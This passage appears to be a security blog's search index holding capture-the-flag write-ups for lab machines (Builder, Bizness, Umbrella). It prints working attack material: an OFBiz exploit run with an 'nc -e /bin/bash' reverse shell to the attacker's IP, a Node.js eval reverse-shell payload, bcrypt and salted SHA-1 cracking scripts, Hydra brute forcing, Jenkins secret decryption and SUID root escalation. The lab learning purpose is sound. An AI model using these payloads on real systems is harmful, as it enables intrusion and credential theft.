\" jennifer\" exists. 10: No such agent \" 10\" exists. : No such agent \" \" exists. false: No such agent \" false\" exists. : No such agent \" \" exists. {HASHVALUE in bcrypt}: No such agent \" {HASHVALUE in bcrypt}\" exists.```{: .nolineno}The summarized output is like this : ```xml jennifer 6841d11dc1de101d jennifer 10 false {HASHVALUE in bcrypt}```{: .nolineno}The output provided the bcrypt encrypted password.### Password Decryption â¤µï¸I used John the Ripper to crack the bcrypt encrypted password, revealing ``. This allowed me to login as the user `jennifer`.```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Builder]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt Using default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status (?) 1g 0:00:00:01 DONE (2024-02-14 14:10) 0.5714g/s 10.28p/s 10.28c/s 10.28C/s 123456..michaelUse the \"--show\" option to display all of the cracked passwords reliablySession completed. ```{: .nolineno}Now I will use this \\ to login as user jennifer ->![Dashboard](Pasted%20image%2020240214144327.png)_Logged in as Jennifer User_I also knew that I can access files like credentials.xml that contains the privatekey or secret key of a user in this case I found this ->![Image](Pasted%20image%2020240214145109.png)![Image](Pasted%20image%2020240214150219.png)```bash{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo4qcqH61hjEUdZtkPiX6buY1J4YKYFziwyFA1wH/X5XHjUb8lUYkf/XSuDhR5tIpVWwkk7l1FTYwQQl/i5MOTww3b1QNzIAIv41KLKDgsq4WUAS5RBt4OZ7v410VZgdVDDciihmdDmqdsiGUOFubePU9a4tQoED2uUHAWbPlduIXaAfDs77evLh98/INI8o/A+rlX6ehT0K40cD3NBEF/4Adl6BOQ/NSWquI5xTmmEBi3NqpWWttJl1q9soOzFV0C4mhQiGIYr8TPDbpdRfsgjGNKTzIpjPPmRr+j5ym5noOP/LVw09+AoEYvzrVKlN7MWYOoUSqD+C9iXGxTgxSLWdIeCALzz9GHuN7a1tYIClFHT1WQpa42EqfqcoB12dkP74EQ8JL4RrxgjgEVeD4stcmtUOFqXU/gezb/oh0Rko9tumajwLpQrLxbAycC6xgOuk/leKf1gkDOEmraO7ui......R8IMMaKSM=}```{: .nolineno}Now this private key can be cracked through hudson.util.secret but if I access it its data doesn't return in proper format so I can't use that so the other way to crack this private key is to use the jenkins script console and execute this : `println(hudson.util.Secret.decrypt(\"{...}\"))`command that will decode this private key and I can then use it to login as that user , so lets try it now ->![Image](Pasted%20image%2020240214145914.png)_Got the id_rsa key through groovy script decrypt_### SSH Shell Access â¤µï¸I accessed the SSH shell as `root` using the obtained credentials:```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Builder]â””â”€$ ssh root@10.10.11.10 -i id_rsa The authenticity of host '10.10.11.10 (10.10.11.10)' can not be established.ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.10' (ED25519) to the list of known hosts.Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Wed Feb 14 09:33:31 AM UTC 2024 System load: 0.16064453125 Usage of /: 66.3% of 5.81GB Memory usage: 20% Swap usage: 0% Processes: 218 Users logged in: 0 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.10 IPv6 address for eth0: dead:beef::250:56ff:feb9:adc9Expanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusLast login: Mon Feb 12 13:15:44 2024 from 10.10.14.40root@builder:~# whoamirootroot@builder:~# iduid=0(root) gid=0(root) groups=0(root)root@builder:~# ls -altotal 32drwx------ 5 root root 4096 Feb 14 05:01 .drwxr-xr-x 18 root root 4096 Feb 9 15:45 ..lrwxrwxrwx 1 root root 9 Apr 27 2023 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwx------ 2 root root 4096 Apr 27 2023 .cachedrwxr-xr-x 3 root root 4096 Apr 27 2023 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 33 Feb 14 05:01 root.txtdrwx------ 2 root root 4096 Feb 8 11:24 .sshroot@builder:~# cat root.txt25cc28c0d896fbca1a7e196ed47fdc0broot@builder:~# ```{: .nolineno}I am root now !!## ConclusionBy exploiting the identified vulnerabilities, I successfully gained root access, highlighting critical security flaws for remediation.> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Bizness", "url": "/posts/Bizness/", "categories": "HackTheBox", "tags": "Ofbiz, SHA-1, PrivEsc", "date": "2024-02-12 00:00:00 +0530", "snippet": "## Detailed Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Bizness]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.11.252 Nmap scan report for 10.10.11.252Host is up (0.16s lat...", "content": "## Detailed Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Bizness]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.11.252 Nmap scan report for 10.10.11.252Host is up (0.16s latency).Not shown: 65427 closed tcp ports (reset), 104 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)| ssh-hostkey: | 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)| 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)|_ 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to https://bizness.htb/443/tcp open ssl/http nginx 1.18.0| tls-nextprotoneg: |_ http/1.1|_http-title: Did not follow redirect to https://bizness.htb/|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK| Not valid before: 2023-12-14T20:03:40|_Not valid after: 2328-11-10T20:03:4045257/tcp open tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Exploring the Web Interface â¤µï¸Upon conducting a thorough port scan, I discovered various services running on the target machine. Port 80 redirects to `bizness.htb`, indicating potential web vulnerabilities. By setting the host name in `/etc/hosts`, I initiated directory or files bruteforcing and unearthed several directories.### Utilizing an Exploit for CVEs â¤µï¸Further investigation led me to an exploit applicable to CVE-2023-49070 and CVE-2023-51467, affecting the target system. Leveraging this exploit allowed me to establish a connection to the victim machine successfully:[Apache-OFBiz Exploit](https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz)```bashpython3 exploit1.py --url http://bizness.htb/ --cmd 'nc -e /bin/bash 10.10.14.31 4444'```{: .nolineno}![Image](Pasted%20image%2020240212110804.png)_Checking the Exploit is working or not with a callback._Verification of the exploit's functionality was conducted, affirming the system's vulnerability. Subsequently, a reverse shell was obtained to delve deeper into the system.![Image](Pasted%20image%2020240212111039.png)_Getting reverse shell from exploit ._Now I have a shell lets dig deeper into it ->### Gaining SSH Shell Access â¤µï¸During reconnaissance, crucial information was uncovered in a directory:```bashofbiz@bizness:/opt/ofbiz/framework/resources/templates$ lslsAdminNewTenantData-Derby.xml index.jspAdminNewTenantData-MySQL.xml Menus.xmlAdminNewTenantData-Oracle.xml ofbiz-component.xmlAdminNewTenantData-PostgreSQL.xml README.txtAdminUserLoginData.xml Screens.xmlbuild.gradle SecurityGroupDemoData.xmlCommonScreens.xml SecurityPermissionSeedData.xmlcontroller.xml services.xmlDemoData.xml Tests.xmldocument.xml TypeData.xmlentitymodel.xml UiLabels.xmlForms.xml web.xmlHELP.xml```{: .nolineno}Among the files, `AdminUserLoginData.xml` contained or housed the hashed password for the admin account. ```xmlofbiz@bizness:/opt/ofbiz/framework/resources/templates$ cat AdminUserLoginData.xmlcat AdminUserLoginData.xml...... ofbiz@bizness:/opt/ofbiz/framework/resources/templates$ ```{: .nolineno}This hash `{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a` ,Although initial decryption attempts failed, persistence led to the discovery of a password salt in `.bat` format `runtime/data/derby/ofbiz/seg0/c54d0.dat` , providing crucial insights for password recovery.```xmlofbiz@bizness:/opt/ofbiz$ strings runtime/data/derby/ofbiz/seg0/c54d0.datstrings runtime/data/derby/ofbiz/seg0/c54d0.dat8501 10000J ofbiz@bizness:/opt/ofbiz$ ```{: .nolineno}Now I have the salt value that is added with password to generate that hash value of SHA-1 encryption. ```bashcurrentPassword=\"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I\"```{: .nolineno}I got a script searching online as the code is a utility for finding a password given its hash value and salt, using brute-force techniques with a wordlist of potential passwords. It makes use of cryptographic techniques like hashing and salting to securely compare potential passwords against the target hash.**Password Decryption and Root Access**Utilizing a Python script designed for hash decryption, I successfully decoded the hashed password, revealing:```pythonimport hashlibimport base64import osfrom tqdm import tqdmclass PasswordEncryptor: def __init__(self, hash_type=\"SHA\", pbkdf2_iterations=10000): self.hash_type = hash_type self.pbkdf2_iterations = pbkdf2_iterations def crypt_bytes(self, salt, value): if not salt: salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8') hash_obj = hashlib.new(self.hash_type) hash_obj.update(salt.encode('utf-8')) hash_obj.update(value) hashed_bytes = hash_obj.digest() result = f\"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}\" return result def get_crypted_bytes(self, salt, value): try: hash_obj = hashlib.new(self.hash_type) hash_obj.update(salt.encode('utf-8')) hash_obj.update(value) hashed_bytes = hash_obj.digest() return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.') except hashlib.NoSuchAlgorithmException as e: raise Exception(f\"Error while computing hash of type {self.hash_type}: {e}\")def brute_force_hash(search, salt, wordlist): encryptor = PasswordEncryptor(\"SHA1\") # Get the number of lines in the wordlist for the loading bar total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1')) # Iterate through the wordlist with a loading bar and check for a matching password with open(wordlist, 'r', encoding='latin-1') as password_list: for password in tqdm(password_list, total=total_lines, desc=\"Processing\"): value = password.strip() # Get the encrypted password hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8')) # Compare with the search hash if hashed_password == search: print(f'Found Password: {value}, hash: {hashed_password}') return print(\"Password not found in wordlist.\")# Example usage:search = \"$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=\"salt = \"d\"wordlist = '/usr/wordlist/rockyou.txt'# Call the function to brute force the hashbrute_force_hash(search, salt, wordlist)```{: .nolineno}I tried it and got this password :![Password](Pasted%20image%2020240212142343.png)```textmonkeybizness```{: .nolineno}## Elevated Privileges: Root Access â¤µï¸Armed with the admin credentials, I escalated privileges to root, gaining unrestricted access to the system. Root privileges granted access to sensitive directories, including the coveted `root.txt` file:```bashofbiz@bizness:~$ su rootsu rootPassword: monkeybiznessroot@bizness:/home/ofbiz# cd ~cd ~root@bizness:~# whoamiwhoamirootroot@bizness:~# ididuid=0(root) gid=0(root) groups=0(root)root@bizness:~# ls -alls -altotal 28drwx------ 4 root root 4096 Feb 12 05:35 .drwxr-xr-x 18 root root 4096 Dec 21 09:15 ..lrwxrwxrwx 1 root root 9 Dec 16 05:21 .bash_history -> /dev/null-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrcdrwxr-xr-x 7 root root 4096 Dec 21 09:15 .gradledrwxr-xr-x 3 root root 4096 Dec 21 09:15 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 33 Feb 12 05:35 root.txtroot@bizness:~# cat root.txtcat root.txtd3cba9747437274175d79eb0761a6371root@bizness:~# ```{: .nolineno}With root access achieved, the penetration test was successfully concluded, highlighting critical vulnerabilities for remediation.> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Umbrella", "url": "/posts/Umbrella/", "categories": "TryHackMe", "tags": "PrivEsc, Docker_Registry, Node.js, eval, mysql", "date": "2024-02-03 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/umbrella]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.161.195 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( htt...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/umbrella]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.161.195 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 20:23 ISTNmap scan report for 10.10.161.195Host is up (0.16s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)| 256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)|_ 256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)3306/tcp filtered mysql5000/tcp open http Docker Registry (API: 2.0)|_http-title: Site does not have a title.8080/tcp filtered http-proxyService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸On loading port 8080 I get this login page :![Image](Pasted%20image%2020240129203115.png)After seeing port scan I got one port , port 5000 that is running Docker Registry Service so I recon about this and I stumbled across this page [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry#enumeration-using-curl) and got some enumeration steps like through `curl` Tool. ```bash#List repositoriescurl -s http://:5000/v2/_catalog#Try for getting tags of a repository, For Example :curl -s http://192.251.36.3:5000/v2/ubuntu/tags/list{\"name\":\"ubuntu\",\"tags\":[\"14.04\",\"12.04\",\"18.04\",\"16.04\"]}#Lets also try to set manifests , For Example :curl -s http://192.251.36.3:5000/v2/ubuntu/manifests/latest......```{: .nolineno}Now with this machine IP lets access those :>```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Umbrella]â””â”€$ curl -s http://10.10.248.13:5000/v2/_catalog{\"repositories\":[\"umbrella/timetracking\"]}```{: .nolineno}I also got something through manifests/latest output :```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Umbrella]â””â”€$ curl -s http://10.10.248.13:5000/v2/umbrella/timetracking/manifests/latest{ \"schemaVersion\": 1, \"name\": \"umbrella/timetracking\", \"tag\": \"latest\", \"architecture\": \"amd64\", \"fsLayers\": [ { \"blobSum\": \"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\" }, { \"blobSum\": \"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\" },......\"history\": [ { \"v1Compatibility\": \"{\\\"architecture\\\":\\\"amd64\\\",\\\"config\\\":{\\\"Hostname\\\":\\\"\\\",\\\"Domainname\\\":\\\"\\\",\\\"User\\\":\\\"\\\",\\\"AttachStdin\\\":false,\\\"AttachStdout\\\":false,\\\"AttachStderr\\\":false,\\\"ExposedPorts\\\":{\\\"8080/tcp\\\":{}},\\\"Tty\\\":false,\\\"OpenStdin\\\":false,\\\"StdinOnce\\\":false,\\\"Env\\\":[\\\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\\",\\\"NODE_VERSION=19.3.0\\\",\\\"YARN_VERSION=1.22.19\\\",\\\"DB_HOST=db\\\",\\\"DB_USER=root\\\",\\\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\\\",\\\"DB_DATABASE=timetracking\\\",\\\"LOG_FILE=/logs/tt.log\\\"],\\\"Cmd\\\":[\\\"node\\\",\\\"app.js\\\"],\\\"Image\\\":\\\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\\\",\\\"Volumes\\\":null,\\\"WorkingDir\\\":\\\"/usr/src/app\\\",\\\"Entrypoint\\\":[\\\"docker-entrypoint.sh\\\"],\\\"OnBuild\\\":null,\\\"Labels\\\":null},\\\"container\\\":\\\"527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9\\\",\\\"container_config\\\":{\\\"Hostname\\\":\\\"527e55a70a33\\\",\\\"Domainname\\\":\\\"\\\",\\\"User\\\":\\\"\\\",\\\"AttachStdin\\\":false,\\\"AttachStdout\\\":false,\\\"AttachStderr\\\":false,\\\"ExposedPorts\\\":{\\\"8080/tcp\\\":{}},\\\"Tty\\\":false,\\\"OpenStdin\\\":false,\\\"StdinOnce\\\":false,\\\"Env\\\":[\\\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\\",\\\"NODE_VERSION=19.3.0\\\",\\\"YARN_VERSION=1.22.19\\\",\\\"DB_HOST=db\\\",\\\"DB_USER=root\\\",\\\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\\\",\\\"DB_DATABASE=timetracking\\\",\\\"LOG_FILE=/logs/tt.log\\\"],\\\"Cmd\\\":[\\\"/bin/sh\\\",\\\"-c\\\",\\\"#(nop) \\\",\\\"CMD [\\\\\\\"node\\\\\\\" \\\\\\\"app.js\\\\\\\"]\\\"],\\\"Image\\\":\\\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\\\",\\\"Volumes\\\":null,\\\"WorkingDir\\\":\\\"/usr/src/app\\\",\\\"Entrypoint\\\":[\\\"docker-entrypoint.sh\\\"],\\\"OnBuild\\\":null,\\\"Labels\\\":{}},\\\"created\\\":\\\"2022-12-22T10:03:08.042002316Z\\\",\\\"docker_version\\\":\\\"20.10.17\\\",\\\"id\\\":\\\"7aec279d6e756678a51a8f075db1f0a053546364bcf5455f482870cef3b924b4\\\",\\\"os\\\":\\\"linux\\\",\\\"parent\\\":\\\"47c36cf308f072d4b86c63dbd2933d1a49bf7adb87b0e43579d9c7f5e6830ab8\\\",\\\"throwaway\\\":true}\"......```{: .nolineno}From Above output data I got this data ->```bash\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\"NODE_VERSION=19.3.0\"\"YARN_VERSION=1.22.19\"\"DB_HOST=db\"\"DB_USER=root\"\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\"\"DB_DATABASE=timetracking\"\"LOG_FILE=/logs/tt.log\"]```{: .nolineno}Lets login into mysql server :![Image](Pasted%20image%2020240203135426.png)Lets access `timetracking` database.```mysqlMySQL [timetracking]> select * from users;+----------+----------------------------------+-------+| user | pass | time |+----------+----------------------------------+-------+| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 | 360 || chris-r | 0d107d09f5bbe40cade3de5c71e9e9b7 | 420 || jill-v | d5c0607301ad5d5c1528962a83992ac8 | 564 || barry-b | 4a04890400b5d7bac101baace5d7e994 | 47893 |+----------+----------------------------------+-------+4 rows in set (1.869 sec)```{: .nolineno}![Image](Pasted%20image%2020240203135810.png)I got the password cracked so lets use those and see do I have a shell or not .```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Umbrella]â””â”€$ hydra -L users.txt -P pass.txt ssh://10.10.248.13 -t 4Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-03 14:02:11[DATA] max 4 tasks per 1 server, overall 4 tasks, 16 login tries (l:4/p:4), ~4 tries per task[DATA] attacking ssh://10.10.248.13:22/[22][ssh] host: 10.10.248.13 login: claire-r password: Password11 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-03 14:02:44 ```{: .nolineno}I got the result through `hydra` Tool.Lets have a Shell ->### SSH Shell â¤µï¸```bashâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Umbrella]â””â”€$ ssh claire-r@10.10.146.217The authenticity of host '10.10.146.217 (10.10.146.217)' ca t be established.ED25519 key fingerprint is SHA256:4O8itcDPWBL0nD2ELrDFEMiWY9Pn8UuEdRRP7L8pxr8.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:1: [hashed name] ~/.ssh/known_hosts:3: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.146.217' (ED25519) to the list of known hosts.claire-r@10.10.146.217 is password: Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information disabled due to load higher than 1.0 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s just raised the bar for easy, resilient and secure K8s cluster deployment. https://ubuntu.com/engage/secure-kubernetes-at-the-edge20 updates can be applied immediately.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateThe programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.claire-r@ctf:~$claire-r@ctf:~$ whoamiclaire-rclaire-r@ctf:~$ iduid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)claire-r@ctf:~$ ls -altotal 36drwxr-xr-x 4 claire-r claire-r 4096 Feb 3 17:20 .drwxr-xr-x 4 root root 4096 Dec 22 2022 ..-rw------- 1 claire-r claire-r 61 Sep 22 18:26 .bash_history-rw-r--r-- 1 claire-r claire-r 220 Dec 22 2022 .bash_logout-rw-r--r-- 1 claire-r claire-r 3771 Dec 22 2022 .bashrcdrwx------ 2 claire-r claire-r 4096 Feb 3 17:20 .cache-rw-r--r-- 1 claire-r claire-r 807 Dec 22 2022 .profiledrwxrwxr-x 6 claire-r claire-r 4096 Dec 22 2022 timeTracker-src-rw-r--r-- 1 claire-r claire-r 38 Dec 22 2022 user.txtclaire-r@ctf:~$```{: .nolineno}I got the a function vulnerable in **app.js** file that is eval ->![eval](Pasted%20image%2020240203154430.png)_Eval function can be exploited here_Here eval() function can execute any command before parseInt() function execution.I recon related to `Node.js eval reverse shell` and I got this payload :```js(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/bash\", []); var client = new net.Socket(); client.connect(4444, \"10.17.1.0\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})()```{: .nolineno}Lets use it through web login in time parameter ->![Image](Pasted%20image%2020240203225707.png)here the time is added into the claire-r slot so I have to input the payload in time parameter like this and start the listener at port 4444.![Image](Pasted%20image%2020240203225927.png)```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Umbrella]â””â”€$ rlwrap nc -lvnp 4444 listening on [any] 4444 ...connect to [10.17.1.0] from (UNKNOWN) [10.10.146.217] 58766SHELL=/bin/bash script -q /dev/nullroot@de0610f51845:/usr/src/app# whoamiwhoamirootroot@de0610f51845:/usr/src/app# ididuid=0(root) gid=0(root) groups=0(root)root@de0610f51845:/usr/src/app# ls -alls -altotal 92drwxr-xr-x 1 root root 4096 Dec 22 2022 .drwxr-xr-x 1 root root 4096 Dec 22 2022 ..-rw-rw-r-- 1 root root 3237 Dec 22 2022 app.jsdrwxr-xr-x 87 root root 4096 Dec 22 2022 node_modules-rw-rw-r-- 1 root root 63965 Dec 22 2022 package-lock.json-rw-rw-r-- 1 root root 385 Dec 22 2022 package.jsondrwxr-xr-x 3 root root 4096 Dec 22 2022 publicdrwxr-xr-x 2 root root 4096 Dec 22 2022 viewsroot@de0610f51845:/usr/src/app# cd ../cd ../root@de0610f51845:/usr/src# ls -alls -altotal 12drwxr-xr-x 1 root root 4096 Dec 22 2022 .drwxr-xr-x 1 root root 4096 Dec 19 2022 ..drwxr-xr-x 1 root root 4096 Dec 22 2022 approot@de0610f51845:/usr/src# cd /cd /root@de0610f51845:/# ls -alls -altotal 76drwxr-xr-x 1 root root 4096 Dec 22 2022 .drwxr-xr-x 1 root root 4096 Dec 22 2022 ..-rwxr-xr-x 1 root root 0 Dec 22 2022 .dockerenvdrwxr-xr-x 2 root root 4096 Dec 19 2022 bindrwxr-xr-x 2 root root 4096 Dec 9 2022 bootdrwxr-xr-x 5 root root 340 Feb 3 17:20 devdrwxr-xr-x 1 root root 4096 Dec 22 2022 etcdrwxr-xr-x 1 root root 4096 Dec 21 2022 homedrwxr-xr-x 1 root root 4096 Dec 19 2022 libdrwxr-xr-x 2 root root 4096 Dec 19 2022 lib64drwxrw-rw- 2 1001 1001 4096 Dec 22 2022 logsdrwxr-xr-x 2 root root 4096 Dec 19 2022 mediadrwxr-xr-x 2 root root 4096 Dec 19 2022 mntdrwxr-xr-x 1 root root 4096 Dec 21 2022 optdr-xr-xr-x 180 root root 0 Feb 3 17:20 procdrwx------ 1 root root 4096 Dec 21 2022 rootdrwxr-xr-x 3 root root 4096 Dec 19 2022 rundrwxr-xr-x 2 root root 4096 Dec 19 2022 sbindrwxr-xr-x 2 root root 4096 Dec 19 2022 srvdr-xr-xr-x 13 root root 0 Feb 3 17:20 sysdrwxrwxrwt 1 root root 4096 Dec 21 2022 tmpdrwxr-xr-x 1 root root 4096 Dec 19 2022 usrdrwxr-xr-x 1 root root 4096 Dec 19 2022 varroot@de0610f51845:/# cd logscd logsroot@de0610f51845:/logs# ls -alls -altotal 12drwxrw-rw- 2 1001 1001 4096 Dec 22 2022 .drwxr-xr-x 1 root root 4096 Dec 22 2022 ..-rw-r--r-- 1 root root 97 Feb 3 17:22 tt.logroot@de0610f51845:/logs# cp /bin/bash smashcp /bin/bash smashroot@de0610f51845:/logs# chmod u+s smashchmod u+s smashroot@de0610f51845:/logs# ls -alls -altotal 1220drwxrw-rw- 2 1001 1001 4096 Feb 3 17:24 .drwxr-xr-x 1 root root 4096 Dec 22 2022 ..-rwsr-xr-x 1 root root 1234376 Feb 3 17:24 smash-rw-r--r-- 1 root root 97 Feb 3 17:22 tt.logroot@de0610f51845:/logs# ```{: .nolineno}Here I copied the bash and put it into the logs folder and given the permissions for `set user ID` as (SUIDs) and then I accessed this `bash` made `smash` through `claire-r` machine and used that to get `effective user ID` (eUID) as root and I got it ->```bashclaire-r@ctf:~/timeTracker-src$ cd logsclaire-r@ctf:~/timeTracker-src/logs$ ls -altotal 1220drwxrw-rw- 2 claire-r claire-r 4096 Feb 3 17:24 .drwxrwxr-x 6 claire-r claire-r 4096 Dec 22 2022 ..-rwsr-xr-x 1 root root 1234376 Feb 3 17:24 smash-rw-r--r-- 1 root root 97 Feb 3 17:22 tt.logclaire-r@ctf:~/timeTracker-src/logs$ ./smash -psmash-5.1# whoamirootsmash-5.1# iduid=1001(claire-r) gid=1001(claire-r) euid=0(root) groups=1001(claire-r)smash-5.1# cd /rootsmash-5.1# ls -altotal 40drwx------ 5 root root 4096 Sep 22 18:32 .drwxr-xr-x 19 root root 4096 Dec 20 2022 ..lrwxrwxrwx 1 root root 9 Sep 22 18:32 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 3 root root 4096 Dec 22 2022 .gnupg-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw-r--r-- 1 root root 38 Dec 22 2022 root.txtdrwx------ 4 root root 4096 Dec 20 2022 snapdrwx------ 2 root root 4096 Dec 20 2022 .ssh-rw------- 1 root root 1106 Dec 22 2022 .viminfo-rw-r--r-- 1 root root 165 Dec 22 2022 .wget-hstssmash-5.1# cat root.txtTHM{FLAG_FLAG_FLAG_FLAG_FLAG}smash-5.1# ```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Worker", "url": "/posts/Worker/", "categories": "HackTheBox", "tags": "Azure DevOps, GodPotato, PrivEsc, SeImpersonatePrivilege, Subversion, Windows", "date": "2024-01-25 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.203 -PnNmap scan report for 10.10.10.203Host is up (0.10s latency).No...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Worker]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.203 -PnNmap scan report for 10.10.10.203Host is up (0.10s latency).Not shown: 65524 filtered tcp ports (no-response), 9 filtered tcp ports (host-unreach)PORT STATE SERVICE VERSION3690/tcp open svnserve Subversion5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: 